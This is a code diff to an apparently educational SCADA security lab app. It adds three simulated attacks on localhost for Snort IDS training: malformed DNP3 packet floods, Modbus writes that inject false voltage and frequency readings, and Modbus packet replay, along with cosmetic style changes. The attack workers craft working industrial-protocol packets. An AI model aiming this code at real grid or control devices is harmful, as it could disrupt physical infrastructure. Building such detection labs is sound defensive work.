@@ -3812,6 +3812,15 @@ class AttackSimulatorTab(QWidget):
         self.port_scan_thread = None
         self.port_scan_running = False
 
+        self.dnp3_attack_thread = None
+        self.dnp3_attack_running = False
+
+        self.false_data_thread = None
+        self.false_data_running = False
+
+        self.replay_attack_thread = None
+        self.replay_attack_running = False
+
         self.init_ui()
 
     def init_ui(self):
@@ -3836,13 +3845,16 @@ class AttackSimulatorTab(QWidget):
         info_layout = QVBoxLayout()
         info_text = QTextEdit()
         info_text.setReadOnly(True)
-        info_text.setMaximumHeight(120)
+        info_text.setMaximumHeight(150)
         info_text.setHtml("""
-        <b>This lab simulates 3 common SCADA attacks that can be detected by Snort IDS:</b>
+        <b>This lab simulates 6 common smart grid/SCADA attacks that can be detected by Snort IDS:</b>
         <ul>
         <li><b>Modbus Flooding:</b> Rapid fire of Modbus function code requests (simulates DoS)</li>
         <li><b>Unauthorized Writes:</b> Attempts to write to Modbus holding registers without authorization</li>
         <li><b>Port Scanning:</b> Rapid scanning of common SCADA ports to discover devices</li>
+        <li><b>DNP3 Protocol Attack:</b> Malformed DNP3 packets targeting electric utility systems</li>
+        <li><b>False Data Injection:</b> Injecting false sensor readings to manipulate grid operations</li>
+        <li><b>Replay Attack:</b> Replaying captured legitimate traffic to execute unauthorized commands</li>
         </ul>
         <i>Use Wireshark or tcpdump to capture traffic, then analyze with Snort rules.</i>
         """)
@@ -3948,6 +3960,105 @@ class AttackSimulatorTab(QWidget):
 
         attack3_group.setLayout(attack3_layout)
         layout.addWidget(attack3_group)
+
+        # Attack 4: DNP3 Protocol Attack
+        attack4_group = QGroupBox("🔵 Attack 4: DNP3 Protocol Attack")
+        attack4_layout = QVBoxLayout()
+
+        attack4_desc = QLabel("Sends malformed DNP3 protocol packets targeting electric utility SCADA systems (Port 20000)")
+        attack4_desc.setWordWrap(True)
+        attack4_layout.addWidget(attack4_desc)
+
+        attack4_controls = QHBoxLayout()
+        self.attack4_target = QLabel("Target: DNP3 Device (127.0.0.1:20000)")
+        attack4_controls.addWidget(self.attack4_target)
+        attack4_controls.addStretch()
+
+        self.attack4_start_btn = QPushButton("▶️ Start Attack")
+        self.attack4_start_btn.clicked.connect(self.start_dnp3_attack)
+        self.attack4_start_btn.setStyleSheet("background-color: #28a745; color: white; font-weight: bold; padding: 8px;")
+        attack4_controls.addWidget(self.attack4_start_btn)
+
+        self.attack4_stop_btn = QPushButton("⏹️ Stop Attack")
+        self.attack4_stop_btn.clicked.connect(self.stop_dnp3_attack)
+        self.attack4_stop_btn.setEnabled(False)
+        self.attack4_stop_btn.setStyleSheet("background-color: #dc3545; color: white; font-weight: bold; padding: 8px;")
+        attack4_controls.addWidget(self.attack4_stop_btn)
+
+        attack4_layout.addLayout(attack4_controls)
+
+        self.attack4_status = QLabel("Status: Idle")
+        self.attack4_status.setStyleSheet("color: #666; font-style: italic;")
+        attack4_layout.addWidget(self.attack4_status)
+
+        attack4_group.setLayout(attack4_layout)
+        layout.addWidget(attack4_group)
+
+        # Attack 5: False Data Injection Attack
+        attack5_group = QGroupBox("🟣 Attack 5: False Data Injection Attack")
+        attack5_layout = QVBoxLayout()
+
+        attack5_desc = QLabel("Injects false sensor readings (voltage, frequency) to manipulate smart grid operations")
+        attack5_desc.setWordWrap(True)
+        attack5_layout.addWidget(attack5_desc)
+
+        attack5_controls = QHBoxLayout()
+        self.attack5_target = QLabel("Target: RTU_001 (127.0.0.1:502)")
+        attack5_controls.addWidget(self.attack5_target)
+        attack5_controls.addStretch()
+
+        self.attack5_start_btn = QPushButton("▶️ Start Attack")
+        self.attack5_start_btn.clicked.connect(self.start_false_data_attack)
+        self.attack5_start_btn.setStyleSheet("background-color: #28a745; color: white; font-weight: bold; padding: 8px;")
+        attack5_controls.addWidget(self.attack5_start_btn)
+
+        self.attack5_stop_btn = QPushButton("⏹️ Stop Attack")
+        self.attack5_stop_btn.clicked.connect(self.stop_false_data_attack)
+        self.attack5_stop_btn.setEnabled(False)
+        self.attack5_stop_btn.setStyleSheet("background-color: #dc3545; color: white; font-weight: bold; padding: 8px;")
+        attack5_controls.addWidget(self.attack5_stop_btn)
+
+        attack5_layout.addLayout(attack5_controls)
+
+        self.attack5_status = QLabel("Status: Idle")
+        self.attack5_status.setStyleSheet("color: #666; font-style: italic;")
+        attack5_layout.addWidget(self.attack5_status)
+
+        attack5_group.setLayout(attack5_layout)
+        layout.addWidget(attack5_group)
+
+        # Attack 6: Replay Attack
+        attack6_group = QGroupBox("🟤 Attack 6: Replay Attack")
+        attack6_layout = QVBoxLayout()
+
+        attack6_desc = QLabel("Captures and replays legitimate Modbus traffic to execute unauthorized control commands")
+        attack6_desc.setWordWrap(True)
+        attack6_layout.addWidget(attack6_desc)
+
+        attack6_controls = QHBoxLayout()
+        self.attack6_target = QLabel("Target: RTU_001 (127.0.0.1:502)")
+        attack6_controls.addWidget(self.attack6_target)
+        attack6_controls.addStretch()
+
+        self.attack6_start_btn = QPushButton("▶️ Start Attack")
+        self.attack6_start_btn.clicked.connect(self.start_replay_attack)
+        self.attack6_start_btn.setStyleSheet("background-color: #28a745; color: white; font-weight: bold; padding: 8px;")
+        attack6_controls.addWidget(self.attack6_start_btn)
+
+        self.attack6_stop_btn = QPushButton("⏹️ Stop Attack")
+        self.attack6_stop_btn.clicked.connect(self.stop_replay_attack)
+        self.attack6_stop_btn.setEnabled(False)
+        self.attack6_stop_btn.setStyleSheet("background-color: #dc3545; color: white; font-weight: bold; padding: 8px;")
+        attack6_controls.addWidget(self.attack6_stop_btn)
+
+        attack6_layout.addLayout(attack6_controls)
+
+        self.attack6_status = QLabel("Status: Idle")
+        self.attack6_status.setStyleSheet("color: #666; font-style: italic;")
+        attack6_layout.addWidget(self.attack6_status)
+
+        attack6_group.setLayout(attack6_layout)
+        layout.addWidget(attack6_group)
 
         # Log display
         log_group = QGroupBox("📋 Attack Log")
@@ -4188,6 +4299,245 @@ class AttackSimulatorTab(QWidget):
 
                 except Exception:
                     pass
+
+    # ===== Attack 4: DNP3 Protocol Attack =====
+    def start_dnp3_attack(self):
+        """Start DNP3 protocol attack"""
+        if self.dnp3_attack_running:
+            return
+
+        self.dnp3_attack_running = True
+        self.attack4_start_btn.setEnabled(False)
+        self.attack4_stop_btn.setEnabled(True)
+        self.attack4_status.setText("Status: 🔵 ATTACKING - Sending malformed DNP3 packets...")
+        self.attack4_status.setStyleSheet("color: blue; font-weight: bold;")
+
+        self.add_log("🔵 ATTACK 4 STARTED: DNP3 Protocol Attack")
+
+        self.dnp3_attack_thread = threading.Thread(target=self._dnp3_attack_worker, daemon=True)
+        self.dnp3_attack_thread.start()
+
+    def stop_dnp3_attack(self):
+        """Stop DNP3 protocol attack"""
+        if not self.dnp3_attack_running:
+            return
+
+        self.dnp3_attack_running = False
+        self.attack4_start_btn.setEnabled(True)
+        self.attack4_stop_btn.setEnabled(False)
+        self.attack4_status.setText("Status: Stopped")
+        self.attack4_status.setStyleSheet("color: #666; font-style: italic;")
+
+        self.add_log("⏹️ ATTACK 4 STOPPED: DNP3 attack halted")
+
+    def _dnp3_attack_worker(self):
+        """Worker thread for DNP3 protocol attack"""
+        target_host = "127.0.0.1"
+        target_port = 20000
+        packet_count = 0
+
+        while self.dnp3_attack_running:
+            try:
+                # Create malformed DNP3 packet
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect((target_host, target_port))
+
+                # DNP3 header with malformed data
+                # Start bytes (0x0564), length, control, dest, source
+                start = 0x0564
+                length = random.randint(5, 20)
+                control = 0xC4  # Unconfirmed user data
+                dest = random.randint(0, 65535)
+                source = random.randint(0, 65535)
+
+                # Malformed function code
+                function_code = random.choice([0xFF, 0xEE, 0xDD])  # Invalid function codes
+
+                dnp3_packet = struct.pack('>HHBHH', start, length, control, dest, source)
+                dnp3_packet += bytes([function_code])
+                dnp3_packet += bytes([random.randint(0, 255) for _ in range(10)])  # Random payload
+
+                sock.send(dnp3_packet)
+                sock.close()
+
+                packet_count += 1
+
+                if packet_count % 10 == 0:
+                    self.add_log(f"🔵 Attack 4: Sent {packet_count} malformed DNP3 packets")
+
+                time.sleep(0.05)  # 20 requests per second
+
+            except Exception as e:
+                if self.dnp3_attack_running:
+                    self.add_log(f"⚠️ Attack 4 Error: {str(e)}")
+                time.sleep(0.1)
+
+    # ===== Attack 5: False Data Injection Attack =====
+    def start_false_data_attack(self):
+        """Start false data injection attack"""
+        if self.false_data_running:
+            return
+
+        self.false_data_running = True
+        self.attack5_start_btn.setEnabled(False)
+        self.attack5_stop_btn.setEnabled(True)
+        self.attack5_status.setText("Status: 🟣 ATTACKING - Injecting false sensor data...")
+        self.attack5_status.setStyleSheet("color: purple; font-weight: bold;")
+
+        self.add_log("🟣 ATTACK 5 STARTED: False Data Injection Attack")
+
+        self.false_data_thread = threading.Thread(target=self._false_data_worker, daemon=True)
+        self.false_data_thread.start()
+
+    def stop_false_data_attack(self):
+        """Stop false data injection attack"""
+        if not self.false_data_running:
+            return
+
+        self.false_data_running = False
+        self.attack5_start_btn.setEnabled(True)
+        self.attack5_stop_btn.setEnabled(False)
+        self.attack5_status.setText("Status: Stopped")
+        self.attack5_status.setStyleSheet("color: #666; font-style: italic;")
+
+        self.add_log("⏹️ ATTACK 5 STOPPED: False data injection halted")
+
+    def _false_data_worker(self):
+        """Worker thread for false data injection attack"""
+        target_host = "127.0.0.1"
+        target_port = 502
+        packet_count = 0
+
+        while self.false_data_running:
+            try:
+                # Create Modbus packet with false sensor readings
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect((target_host, target_port))
+
+                # Modbus Write Multiple Registers with false sensor values
+                transaction_id = random.randint(0, 65535)
+                protocol_id = 0
+                unit_id = 1
+                function_code = 0x10  # Write Multiple Registers
+
+                # Target sensor data registers (voltage, frequency, etc.)
+                start_addr = random.choice([10, 20, 30, 40])  # Common sensor registers
+                quantity = 4  # Write 4 registers
+                byte_count = quantity * 2
+
+                # False sensor values (abnormal readings to manipulate grid)
+                false_voltage = random.randint(50000, 80000)  # Abnormal voltage (should be ~22000)
+                false_frequency = random.randint(6500, 7000)  # Abnormal frequency (should be ~6000 for 60Hz)
+                false_current = random.randint(15000, 25000)  # Abnormal current
+                false_power = random.randint(50000, 100000)  # Abnormal power
+
+                length = 7 + byte_count
+
+                request = struct.pack('>HHHBBHHB',
+                                     transaction_id, protocol_id, length,
+                                     unit_id, function_code, start_addr,
+                                     quantity, byte_count)
+
+                # Add false sensor values
+                request += struct.pack('>HHHH', false_voltage, false_frequency, false_current, false_power)
+
+                sock.send(request)
+                sock.close()
+
+                packet_count += 1
+
+                if packet_count % 10 == 0:
+                    self.add_log(f"🟣 Attack 5: Injected {packet_count} false sensor readings")
+
+                time.sleep(0.1)  # 10 requests per second
+
+            except Exception as e:
+                if self.false_data_running:
+                    self.add_log(f"⚠️ Attack 5 Error: {str(e)}")
+                time.sleep(0.1)
+
+    # ===== Attack 6: Replay Attack =====
+    def start_replay_attack(self):
+        """Start replay attack"""
+        if self.replay_attack_running:
+            return
+
+        self.replay_attack_running = True
+        self.attack6_start_btn.setEnabled(False)
+        self.attack6_stop_btn.setEnabled(True)
+        self.attack6_status.setText("Status: 🟤 ATTACKING - Replaying captured traffic...")
+        self.attack6_status.setStyleSheet("color: brown; font-weight: bold;")
+
+        self.add_log("🟤 ATTACK 6 STARTED: Replay Attack")
+
+        self.replay_attack_thread = threading.Thread(target=self._replay_attack_worker, daemon=True)
+        self.replay_attack_thread.start()
+
+    def stop_replay_attack(self):
+        """Stop replay attack"""
+        if not self.replay_attack_running:
+            return
+
+        self.replay_attack_running = False
+        self.attack6_start_btn.setEnabled(True)
+        self.attack6_stop_btn.setEnabled(False)
+        self.attack6_status.setText("Status: Stopped")
+        self.attack6_status.setStyleSheet("color: #666; font-style: italic;")
+
+        self.add_log("⏹️ ATTACK 6 STOPPED: Replay attack halted")
+
+    def _replay_attack_worker(self):
+        """Worker thread for replay attack"""
+        target_host = "127.0.0.1"
+        target_port = 502
+        packet_count = 0
+
+        # Simulated captured legitimate Modbus traffic patterns
+        captured_packets = []
+
+        # Capture phase: Create some "legitimate" looking packets to replay
+        for i in range(5):
+            transaction_id = 1000 + i
+            protocol_id = 0
+            length = 6
+            unit_id = 1
+            function_code = 0x03  # Read Holding Registers
+            start_addr = i * 10
+            quantity = 10
+
+            packet = struct.pack('>HHHBBHH',
+                               transaction_id, protocol_id, length,
+                               unit_id, function_code, start_addr, quantity)
+            captured_packets.append(packet)
+
+        while self.replay_attack_running:
+            try:
+                # Replay captured packets
+                for packet in captured_packets:
+                    if not self.replay_attack_running:
+                        break
+
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.5)
+                    sock.connect((target_host, target_port))
+
+                    # Replay the captured packet multiple times
+                    sock.send(packet)
+                    sock.close()
+
+                    packet_count += 1
+
+                    if packet_count % 10 == 0:
+                        self.add_log(f"🟤 Attack 6: Replayed {packet_count} captured packets")
+
+                    time.sleep(0.02)  # 50 replays per second
+
+            except Exception as e:
+                if self.replay_attack_running:
+                    self.add_log(f"⚠️ Attack 6 Error: {str(e)}")
+                time.sleep(0.1)
 
 
 # ============================================================================
@@ -5095,7 +5445,7 @@ class AIAssessmentTab(QWidget):
         self.asset_info_text = QTextEdit()
         self.asset_info_text.setReadOnly(True)
         self.asset_info_text.setMaximumHeight(90)
-        self.asset_info_text.setStyleSheet("background-color: #f5f5f5; border: 1px solid #ddd; font-size: 10px; padding: 5px;")
+        self.asset_info_text.setStyleSheet("background-color: #E8F4F8; color: #1a1a1a; border: 2px solid #0288D1; font-size: 11px; padding: 8px; font-family: 'Segoe UI', Arial, sans-serif; border-radius: 5px;")
         left_layout.addWidget(QLabel("<b>📊 Asset Info:</b>"))
         left_layout.addWidget(self.asset_info_text)
 
@@ -5112,7 +5462,7 @@ class AIAssessmentTab(QWidget):
         self.prompt_preview = QTextEdit()
         self.prompt_preview.setReadOnly(True)
         self.prompt_preview.setMaximumHeight(60)
-        self.prompt_preview.setStyleSheet("background-color: #e8f5e9; border: 1px solid #4caf50; padding: 3px; font-size: 10px;")
+        self.prompt_preview.setStyleSheet("background-color: #E8F5E9; color: #2c2c2c; border: 2px solid #2E7D32; padding: 8px; font-size: 11px; font-family: 'Segoe UI', Arial, sans-serif; border-radius: 5px;")
 
         prompt_layout.addWidget(QLabel("Analysis type:"))
         prompt_layout.addWidget(self.prompt_combo)
@@ -5124,7 +5474,7 @@ class AIAssessmentTab(QWidget):
         self.data_preview = QTextEdit()
         self.data_preview.setReadOnly(True)
         self.data_preview.setMinimumHeight(150)
-        self.data_preview.setStyleSheet("background-color: #f5f5f5; border: 2px solid #2196F3; padding: 5px; font-family: monospace; font-size: 9px;")
+        self.data_preview.setStyleSheet("background-color: #F5F5F5; color: #1a1a1a; border: 3px solid #1976D2; padding: 10px; font-family: 'Consolas', 'Courier New', monospace; font-size: 11px; border-radius: 5px;")
         self.data_preview.setPlaceholderText("Select an asset to preview data...")
         prompt_layout.addWidget(self.data_preview)
 
@@ -5195,7 +5545,7 @@ class AIAssessmentTab(QWidget):
         summary_layout = QVBoxLayout()
         self.summary_text = QTextEdit()
         self.summary_text.setReadOnly(True)
-        self.summary_text.setStyleSheet("background-color: #E8F5E9; padding: 10px; font-size: 11px;")
+        self.summary_text.setStyleSheet("background-color: #E8F5E9; color: #1a1a1a; padding: 15px; font-size: 13px; font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; border-radius: 5px;")
         self.summary_text.setPlaceholderText("Quick overview will appear here...")
         summary_layout.addWidget(self.summary_text)
         self.summary_tab.setLayout(summary_layout)
@@ -5205,7 +5555,7 @@ class AIAssessmentTab(QWidget):
         vuln_layout = QVBoxLayout()
         self.vuln_details_text = QTextEdit()
         self.vuln_details_text.setReadOnly(True)
-        self.vuln_details_text.setStyleSheet("background-color: #FFEBEE; padding: 10px; font-size: 11px;")
+        self.vuln_details_text.setStyleSheet("background-color: #FFEBEE; color: #2c2c2c; padding: 15px; font-size: 13px; font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; border-radius: 5px;")
         self.vuln_details_text.setPlaceholderText("Vulnerability details will appear here...")
         vuln_layout.addWidget(self.vuln_details_text)
         self.vuln_details_tab.setLayout(vuln_layout)
@@ -5215,7 +5565,7 @@ class AIAssessmentTab(QWidget):
         rec_layout = QVBoxLayout()
         self.recommendations_text = QTextEdit()
         self.recommendations_text.setReadOnly(True)
-        self.recommendations_text.setStyleSheet("background-color: #E3F2FD; padding: 10px; font-size: 11px;")
+        self.recommendations_text.setStyleSheet("background-color: #E3F2FD; color: #1a1a1a; padding: 15px; font-size: 13px; font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; border-radius: 5px;")
         self.recommendations_text.setPlaceholderText("Actionable recommendations will appear here...")
         rec_layout.addWidget(self.recommendations_text)
         self.recommendations_tab.setLayout(rec_layout)
@@ -5225,7 +5575,7 @@ class AIAssessmentTab(QWidget):
         tech_layout = QVBoxLayout()
         self.technical_text = QTextEdit()
         self.technical_text.setReadOnly(True)
-        self.technical_text.setStyleSheet("background-color: #FFF3E0; padding: 10px; font-size: 11px;")
+        self.technical_text.setStyleSheet("background-color: #FFF3E0; color: #2c2c2c; padding: 15px; font-size: 13px; font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; border-radius: 5px;")
         self.technical_text.setPlaceholderText("Technical details will appear here...")
         tech_layout.addWidget(self.technical_text)
         self.technical_tab.setLayout(tech_layout)
@@ -5235,7 +5585,7 @@ class AIAssessmentTab(QWidget):
         full_layout = QVBoxLayout()
         self.ai_response_text = QTextEdit()
         self.ai_response_text.setReadOnly(True)
-        self.ai_response_text.setStyleSheet("background-color: #ffffff; padding: 10px; font-family: monospace; font-size: 10px;")
+        self.ai_response_text.setStyleSheet("background-color: #FAFAFA; color: #1a1a1a; padding: 15px; font-family: 'Consolas', 'Courier New', monospace; font-size: 12px; line-height: 1.5; border-radius: 5px;")
         self.ai_response_text.setPlaceholderText("Complete AI response will appear here...")
         full_layout.addWidget(self.ai_response_text)
         self.full_report_tab.setLayout(full_layout)
@@ -5897,11 +6247,14 @@ class AnalysisRecommendationsTab(QWidget):
         self.overview_text = QTextEdit()
         self.overview_text.setReadOnly(True)
         self.overview_text.setStyleSheet("""
-            background-color: #FFFFFF;
-            border: 2px solid #4CAF50;
-            padding: 15px;
-            font-size: 13px;
-            line-height: 1.6;
+            background-color: #F0F8FF;
+            color: #1a1a1a;
+            border: 3px solid #2E7D32;
+            padding: 18px;
+            font-size: 14px;
+            line-height: 1.8;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            border-radius: 8px;
         """)
         overview_layout.addWidget(self.overview_text)
         overview_tab.setLayout(overview_layout)
@@ -5914,11 +6267,14 @@ class AnalysisRecommendationsTab(QWidget):
         self.vuln_rec_text = QTextEdit()
         self.vuln_rec_text.setReadOnly(True)
         self.vuln_rec_text.setStyleSheet("""
-            background-color: #FFFFFF;
-            border: 2px solid #FF9800;
-            padding: 15px;
-            font-size: 13px;
-            line-height: 1.6;
+            background-color: #FFF8E1;
+            color: #2c2c2c;
+            border: 3px solid #EF6C00;
+            padding: 18px;
+            font-size: 14px;
+            line-height: 1.8;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            border-radius: 8px;
         """)
         vuln_rec_layout.addWidget(self.vuln_rec_text)
         vuln_rec_tab.setLayout(vuln_rec_layout)
@@ -5931,11 +6287,14 @@ class AnalysisRecommendationsTab(QWidget):
         self.threat_rec_text = QTextEdit()
         self.threat_rec_text.setReadOnly(True)
         self.threat_rec_text.setStyleSheet("""
-            background-color: #FFFFFF;
-            border: 2px solid #F44336;
-            padding: 15px;
-            font-size: 13px;
-            line-height: 1.6;
+            background-color: #FFEBEE;
+            color: #1a1a1a;
+            border: 3px solid #C62828;
+            padding: 18px;
+            font-size: 14px;
+            line-height: 1.8;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            border-radius: 8px;
         """)
         threat_rec_layout.addWidget(self.threat_rec_text)
         threat_rec_tab.setLayout(threat_rec_layout)
@@ -5948,11 +6307,14 @@ class AnalysisRecommendationsTab(QWidget):
         self.best_practices_text = QTextEdit()
         self.best_practices_text.setReadOnly(True)
         self.best_practices_text.setStyleSheet("""
-            background-color: #FFFFFF;
-            border: 2px solid #9C27B0;
-            padding: 15px;
-            font-size: 13px;
-            line-height: 1.6;
+            background-color: #F3E5F5;
+            color: #2c2c2c;
+            border: 3px solid #7B1FA2;
+            padding: 18px;
+            font-size: 14px;
+            line-height: 1.8;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            border-radius: 8px;
         """)
         best_practices_layout.addWidget(self.best_practices_text)
         best_practices_tab.setLayout(best_practices_layout)
